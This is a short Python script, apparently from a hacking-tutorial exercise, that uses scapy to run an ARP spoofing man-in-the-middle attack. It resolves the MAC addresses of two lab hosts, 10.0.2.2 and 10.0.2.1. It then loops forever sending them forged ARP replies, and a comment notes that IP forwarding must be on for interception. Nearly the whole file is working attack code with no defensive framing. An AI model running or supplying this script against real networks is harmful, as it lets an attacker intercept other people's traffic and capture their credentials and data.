#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Jan 28 02:14:38 2020

ip_forward needs to be enabled : echo 1 > /proc/sys/net/ipv4/ip_forward
"""

import scapy.all as scapy
import time

def get_mac(ip):
    # the next two lines creates a packet that asks for a specific ip
    arp_req_packet = scapy.ARP()
    arp_req_packet.pdst=ip
    # creating the broadcast MAC address packet
    broadcast_packet = scapy.Ether()
    broadcast_packet.dst = "ff:ff:ff:ff:ff:ff"
    # combining packets
    bc_arpreq_packet = broadcast_packet/arp_req_packet
    # sending and receiving packets, the answered ones and the unanswered. The timeout is necessary.  
    ans_list = scapy.srp(bc_arpreq_packet, timeout=1)[0]
    
    return ans_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # you can get the pdst and hwdst fields from the network scanner, psrc must be equal to the gateway IP address. 
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    
sent_packets_num = 0
while True:
    spoof("10.0.2.2", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.2")
    sent_packets_num+=2
    print("\rPackets sent: " + str(sent_packets_num), end="")
    time.sleep(2)